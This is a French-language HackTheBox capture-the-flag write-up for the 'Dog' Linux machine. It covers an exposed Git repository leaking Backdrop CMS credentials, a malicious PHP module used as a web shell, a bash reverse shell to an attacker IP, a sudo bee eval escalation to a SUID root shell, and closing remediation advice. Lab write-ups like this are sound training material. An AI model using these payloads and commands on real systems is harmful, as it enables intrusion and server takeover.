---
layout: post
title: "Dog - HackTheBox WriteUp"
date: 2025-10-27
categories: [CTF, HackTheBox, WriteUp]
tags: [BackdropCMS, Git, CredentialLeak, RCE, PrivilegeEscalation, BeeSudo, Linux]
difficulty: Easy
platform: HackTheBox
author: Aubin SABY
lang: fr
permalink: /fr/blog/2025/10/27/dog-htb-writeup/
excerpt: "Machine Linux facile exploitant un dépôt Git exposé sur Backdrop CMS, RCE authentifiée et escalade via sudo bee."
---

<div class="bg-gradient-to-r from-green-500/10 to-cyan-500/10 p-10 rounded-xl mb-12 border-l-4 border-green-500 shadow-lg">
    <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-8 gap-6">
        <div class="flex-1">
            <h2 class="text-4xl md:text-5xl font-bold text-green-500 mb-3">
                <i class="fas fa-cube mr-3"></i>Dog
            </h2>
            <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl">
                Backdrop CMS Git Exposure + RCE + Sudo Privilege Escalation
            </p>
        </div>
        <div class="flex gap-3">
            <span class="px-5 py-2 bg-green-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fas fa-circle text-xs mr-1"></i>Easy
            </span>
            <span class="px-5 py-2 bg-blue-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fab fa-linux mr-1"></i>Linux
            </span>
        </div>
    </div>

    <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-6">
        <div class="flex items-center gap-3">
            <div class="text-green-500 text-xl">
                <i class="fas fa-calendar"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Date</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">2025-10-27</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-blue-500 text-xl">
                <i class="fas fa-network-wired"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">IP</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">10.10.11.58</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-purple-500 text-xl">
                <i class="fas fa-shield-alt"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">OS</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">Ubuntu 20.04</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-amber-500 text-xl">
                <i class="fas fa-star"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Points</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">20</div>
            </div>
        </div>
    </div>
</div>

## 🎯 Synopsis

**Dog** est une machine <span class="text-highlight-green">**Linux de difficulté facile**</span> mettant en avant la compromission d'un site web tournant sous <span class="text-highlight-blue">**Backdrop CMS**</span>, avec exposition accidentelle d'un <span class="text-highlight-red">**dépôt Git**</span> contenant des informations sensibles.

L'exploitation suit une progression logique : découverte et extraction d'un <span class="text-highlight-orange">**dépôt .git accessible publiquement**</span>, lecture d'informations sensibles (settings.php) révélant des identifiants de base de données, connexion administrateur à Backdrop grâce à des <span class="text-highlight-purple">**identifiants réutilisés**</span>, puis <span class="text-highlight-red">**exécution de code à distance (RCE)**</span> via téléversement d'un module PHP malveillant. Le mouvement latéral vers l'utilisateur système johncusack se fait par réutilisation de mots de passe, et l'<span class="text-highlight-green">**escalade de privilèges**</span> exploite l'exécutable bee autorisé en sudo, permettant une exécution arbitraire de code PHP en tant que root.

<div class="grid md:grid-cols-2 gap-6 my-4">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-portfolio-violet">
        <h3 class="text-2xl font-bold text-portfolio-violet mb-4">
            <i class="fas fa-brain mr-2"></i>Compétences requises
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Énumération Web et reconnaissance CMS</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Analyse de code source et dépôts Git</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Connaissance basique de la structure Linux</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Compréhension du binaire sudo</li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-cyan-500">
        <h3 class="text-2xl font-bold text-cyan-500 mb-4">
            <i class="fas fa-rocket mr-2"></i>Compétences acquises
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Exploitation d'un dépôt Git exposé</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Compromission d'un CMS par RCE</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Abus de configuration sudo via interpréteur PHP</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Utilisation de git-dumper pour exfiltration</li>
        </ul>
    </div>
</div>


## 🔍 Phase 1 — Énumération initiale

### Scan de ports complet

Scan approfondi pour identifier les services exposés :

```bash
nmap -Pn -p- --min-rate=1000 -T4 10.10.11.58
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.11.58 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -Pn -p$ports -sC -sV 10.10.11.58
```

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-xl font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-search mr-2"></i>Résultats du scan
    </h4>
    <div class="space-y-3">
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl text-green-500">
                <i class="fas fa-terminal"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-green-600 dark:text-green-400">Port 22/TCP - SSH</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">OpenSSH 8.2p1 Ubuntu</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Accès authentifié uniquement</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl text-blue-500">
                <i class="fas fa-globe"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-blue-600 dark:text-blue-400">Port 80/TCP - HTTP</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">Apache httpd 2.4.41 - Backdrop CMS 1.27.1</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Présence d'un répertoire .git/ accessible</div>
            </div>
        </div>
    </div>
</div>

Configuration hosts :

```bash
echo "10.10.11.58 dog.htb" | sudo tee -a /etc/hosts
```

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Observation :</strong> La présence d'un répertoire .git indique une potentielle fuite de code source ou de secrets internes.
    </p>
</div>


## 🧩 Phase 2 — Exfiltration du dépôt Git exposé

### Utilisation de git-dumper

Installation et utilisation de l'outil **git-dumper** pour reconstituer le dépôt complet :

```bash
python3 -m venv env
source env/bin/activate
pip install git-dumper
git-dumper http://dog.htb/ dump
```

Une fois téléchargé, restauration des fichiers :

```bash
cd dump
git restore .
```

### Analyse du fichier settings.php

Fichier critique trouvé : `settings.php`

```php
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold">
        <i class="fas fa-key mr-2 text-green-500"></i>
        Identifiants MySQL récupérés : <code>root : BackDropJ2024DS2024</code>
    </p>
</div>

<div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
    <p class="text-amber-800 dark:text-amber-200">
        <i class="fas fa-info-circle mr-2 text-amber-500"></i>
        <strong>Remarque :</strong> Le service MySQL n'est pas exposé, mais ces identifiants peuvent être réutilisés ailleurs (comptes CMS, SSH, etc.).
    </p>
</div>


## 🔎 Phase 3 — Énumération des utilisateurs Backdrop

La page de login CMS (/user/login) est protégée contre le brute-force (timeout). Cependant, BackdropCMS gère des *aliases* d'URL — une approche de fuzzing alternative est possible :

```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
-u "http://dog.htb/?q=accounts/FUZZ" -mc 403
```

Résultats :

```
john
tiffany
```

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Raisonnement :</strong> Backdrop renvoie un code 403 pour des utilisateurs existants (confirmant leur présence).
    </p>
</div>


## 🔓 Phase 4 — Compromission du Backdrop CMS

Test de connexion sur `/user/login` avec le mot de passe extrait de `settings.php` :

- **Utilisateur :** tiffany
- **Mot de passe :** BackDropJ2024DS2024

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        Succès — Accès Administrateur confirmé \\!
    </p>
</div>


## 💣 Phase 5 — Exploitation Authentifiée (RCE)

### a) Découverte de version

```bash
curl http://dog.htb/core/profiles/testing/testing.info
```

Retourne :

```
project = backdrop
version = 1.27.1
```

<div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
    <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
        <i class="fas fa-bug mr-2"></i>Version vulnérable
    </h4>
    <p class="text-gray-700 dark:text-gray-300">
        Backdrop CMS 1.27.1 est vulnérable à une <strong>RCE Authentifiée</strong> (Exploit-DB 51949)
    </p>
</div>

### b) Création du module malveillant

Fichier `shell.php` :

```php
<?php system($_GET['cmd']); ?>
```

Fichier `shell.info` :

```ini
name = Shell
description = Evil module
type = module
core = 1.x
```

Création de l'archive :

```bash
tar -czvf shell.tar.gz shell
```

### c) Téléversement et activation

L'endpoint d'installation se trouve via alias :

```
http://dog.htb/?q=/admin/modules/install
```

Téléversement de `shell.tar.gz` → succès ✅

Exécution :

```
http://dog.htb/modules/shell/shell.php?cmd=id
```


## 🐚 Phase 6 — Reverse Shell

Création d'une connexion inverse :

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.8/1337 0>&1"
```

Sur l'attaquant :

```bash
nc -lvnp 1337
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold">
        <i class="fas fa-terminal mr-2 text-green-500"></i>
        Connexion reçue : <code>uid=33(www-data) gid=33(www-data)</code>
    </p>
</div>


## 🔁 Phase 7 — Mouvement latéral (johncusack)

Inspection du `/etc/passwd` :

```bash
cat /etc/passwd | grep '/home'
```

Présence de l'utilisateur :

```
johncusack:x:1001:1001::/home/johncusack:/bin/bash
```

Test SSH avec les identifiants récupérés :

```bash
sshpass -p 'BackDropJ2024DS2024' ssh johncusack@dog.htb
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        Connexion SSH réussie \\! Réutilisation de mot de passe confirmée.
    </p>
</div>

Flag utilisateur :

```bash
cat /home/johncusack/user.txt
```


## 👑 Phase 8 — Escalade de privilèges (sudo bee)

### a) Vérification des privilèges

```bash
sudo -l
```

Retour :

```
User johncusack may run the following commands on dog:
(ALL : ALL) /usr/local/bin/bee
```

<div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
    <p class="text-amber-800 dark:text-amber-200">
        <i class="fas fa-exclamation-triangle mr-2 text-amber-500"></i>
        <strong>Découverte critique :</strong> L'outil CLI <code>bee</code> peut être exécuté en tant que root sans restriction.
    </p>
</div>

### b) Compréhension de l'outil bee

`bee` est un outil CLI de BackdropCMS — il permet l'exécution de commandes PHP via l'argument `eval`.

### c) Exploitation

Exécution d'un code arbitraire :

```bash
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('whoami && id');"
```

Retour :

```
root
uid=0(root) gid=0(root)
```

Pour un shell persistant :

```bash
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cp /bin/bash /tmp/bash && chmod u+s /tmp/bash');"
```

Puis :

```bash
/tmp/bash -p
whoami
# root
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-xl">
        <i class="fas fa-crown mr-2 text-amber-500"></i>
        root@dog obtenu \\!
    </p>
</div>

Flag root :

```bash
cat /root/root.txt
```

<div class="bg-gradient-to-r from-amber-500/10 to-yellow-500/10 p-6 rounded-xl border-l-4 border-amber-500 my-4">
    <div class="flex items-center gap-4">
        <div class="text-5xl text-amber-500">
            <i class="fas fa-trophy"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned\\!</h4>
            <p class="text-gray-700 dark:text-gray-300">
                <i class="fas fa-flag text-green-500 mr-2"></i><strong>User flag :</strong> /home/johncusack/user.txt<br>
                <i class="fas fa-flag text-red-500 mr-2"></i><strong>Root flag :</strong> /root/root.txt
            </p>
        </div>
    </div>
</div>


## 📋 Phase 9 — Recommandations et remédiations

<div class="grid md:grid-cols-2 gap-6 my-4">
    <div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg border-l-4 border-red-500">
        <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-4 flex items-start">
            <i class="fas fa-ban mr-2 mt-1"></i><span>Erreurs de configuration</span>
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-times text-red-500 mt-1"></i>
                <span>Dépôt .git accessible publiquement</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-times text-red-500 mt-1"></i>
                <span>Identifiants stockés en clair dans le code</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-times text-red-500 mt-1"></i>
                <span>Réutilisation de mots de passe entre services</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-times text-red-500 mt-1"></i>
                <span>Permissions sudo trop permissives</span>
            </li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg border-l-4 border-green-500">
        <h4 class="text-xl font-bold text-green-600 dark:text-green-400 mb-4 flex items-start">
            <i class="fas fa-shield-alt mr-2 mt-1"></i><span>Bonnes pratiques</span>
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Bloquer l'accès aux fichiers .git via configuration serveur</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Utiliser des variables d'environnement pour les secrets</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Appliquer le principe du moindre privilège (sudo)</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Maintenir à jour les CMS et leurs plugins</span>
            </li>
        </ul>
    </div>
</div>

---

## 📝 Récapitulatif des commandes

### 🔍 Phase 1 : Reconnaissance réseau

```bash
# 1. Scan rapide de tous les ports
nmap -Pn -p- --min-rate=1000 -T4 10.10.11.58

# 2. Scan détaillé des ports ouverts
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.11.58 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -Pn -p$ports -sC -sV 10.10.11.58
# → Ports 22 (SSH) et 80 (HTTP) ouverts
```

### 🧩 Phase 2 : Extraction dépôt Git

```bash
# 1. Installation de git-dumper
python3 -m venv env
source env/bin/activate
pip install git-dumper

# 2. Extraction du dépôt
git-dumper http://dog.htb/ dump

# 3. Restauration des fichiers
cd dump
git restore .

# 4. Analyse du fichier settings.php
cat settings.php
# → Credentials MySQL : root:BackDropJ2024DS2024
```

### 🔎 Phase 3 : Énumération utilisateurs

```bash
# Fuzzing des utilisateurs via aliases Backdrop
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
-u "http://dog.htb/?q=accounts/FUZZ" -mc 403
# → Utilisateurs trouvés : john, tiffany
```

### 🔓 Phase 4 : Connexion Backdrop CMS

```bash
# Test de réutilisation de mot de passe
# URL : http://dog.htb/user/login
# Utilisateur : tiffany
# Mot de passe : BackDropJ2024DS2024
# → Accès administrateur obtenu !
```

### 💣 Phase 5 : Exploitation RCE

```bash
# 1. Création du module malveillant
mkdir shell
echo '<?php system($_GET["cmd"]); ?>' > shell/shell.php
cat > shell/shell.info << 'EOF'
name = Shell
description = Evil module
type = module
core = 1.x
EOF

# 2. Création de l'archive
tar -czvf shell.tar.gz shell

# 3. Upload via http://dog.htb/?q=/admin/modules/install
# 4. Activation et test
curl "http://dog.htb/modules/shell/shell.php?cmd=id"
```

### 🐚 Phase 6 : Reverse Shell

```bash
# Sur l'attaquant
nc -lvnp 1337

# Commande RCE
bash -c "bash -i >& /dev/tcp/10.10.14.8/1337 0>&1"
# → www-data shell obtenu
```

### 🔁 Phase 7 : Mouvement latéral

```bash
# Énumération des utilisateurs
cat /etc/passwd | grep '/home'
# → johncusack présent

# Connexion SSH avec réutilisation de mot de passe
sshpass -p 'BackDropJ2024DS2024' ssh johncusack@dog.htb
# → SSH johncusack obtenu !

# Récupération du user flag
cat /home/johncusack/user.txt
```

### 👑 Phase 8 : Escalade de privilèges

```bash
# 1. Vérification sudo
sudo -l
# → /usr/local/bin/bee autorisé

# 2. Exploitation via bee (CLI Backdrop)
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('whoami && id');"
# → root uid=0

# 3. Création d'un shell SUID
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cp /bin/bash /tmp/bash && chmod u+s /tmp/bash');"

# 4. Exécution du shell root
/tmp/bash -p
whoami
# → root !

# 5. Récupération du root flag
cat /root/root.txt
```

---

## 🔗 Chaîne d'attaque résumée

<div class="bg-white dark:bg-dark-navbar px-6 py-5 rounded-xl shadow-lg my-8">
    <h3 class="text-2xl font-bold text-portfolio-violet mb-4 flex items-center">
        <i class="fas fa-project-diagram mr-2"></i>Parcours d'attaque complet
    </h3>
    <div class="space-y-4">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl font-bold text-blue-500 mt-1">1</div>
            <div class="flex-1">
                <div class="font-bold text-blue-600 dark:text-blue-400">Reconnaissance et Git Dump</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Nmap → .git exposé → git-dumper → settings.php</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl font-bold text-green-500 mt-1">2</div>
            <div class="flex-1">
                <div class="font-bold text-green-600 dark:text-green-400">Compromission Backdrop CMS</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Énumération utilisateurs → Login tiffany → RCE via module malveillant</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
            <div class="text-3xl font-bold text-purple-500 mt-1">3</div>
            <div class="flex-1">
                <div class="font-bold text-purple-600 dark:text-purple-400">Mouvement latéral</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">www-data → SSH johncusack (réutilisation password)</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
            <div class="text-3xl font-bold text-red-500 mt-1">4</div>
            <div class="flex-1">
                <div class="font-bold text-red-600 dark:text-red-400">Escalade de privilèges</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">sudo bee → PHP eval → Shell root</div>
            </div>
        </div>
    </div>
</div>

---

## 🏷️ Tags & Références

<div class="flex flex-wrap gap-2 my-4" style="line-height: 1.5;">
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(34, 197, 94, 0.1); color: #22c55e; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Linux</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(59, 130, 246, 0.1); color: #3b82f6; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">BackdropCMS</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(239, 68, 68, 0.1); color: #ef4444; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Git</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(168, 85, 247, 0.1); color: #a855f7; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CredentialLeak</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(245, 158, 11, 0.1); color: #f59e0b; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">RCE</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(99, 102, 241, 0.1); color: #6366f1; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">PrivilegeEscalation</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(236, 72, 153, 0.1); color: #ec4899; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Sudo</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(14, 165, 233, 0.1); color: #0ea5e9; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">BeeSudo</span>
</div>

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-lg font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-link mr-2"></i>Références utiles
    </h4>
    <ul class="space-y-2 text-gray-700 dark:text-gray-300">
        <li>
            <a href="https://www.exploit-db.com/exploits/51949" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                Exploit-DB 51949 - Backdrop CMS RCE
            </a>
        </li>
        <li>
            <a href="https://github.com/arthaud/git-dumper" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                git-dumper - Tool for dumping Git repositories
            </a>
        </li>
        <li>
            <a href="https://backdropcms.org/" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                Backdrop CMS Official Documentation
            </a>
        </li>
    </ul>
</div>

---

<div class="text-center my-12">
    <a href="{{ site.baseurl }}/fr/blog/" class="inline-block bg-gradient-to-r from-portfolio-violet to-cyan-500 hover:from-portfolio-violet-light hover:to-cyan-600 text-white font-bold py-4 px-10 rounded-lg shadow-lg transition duration-300 transform hover:scale-105">
        <i class="fas fa-arrow-left mr-2"></i>Retour au blog
    </a>
</div>
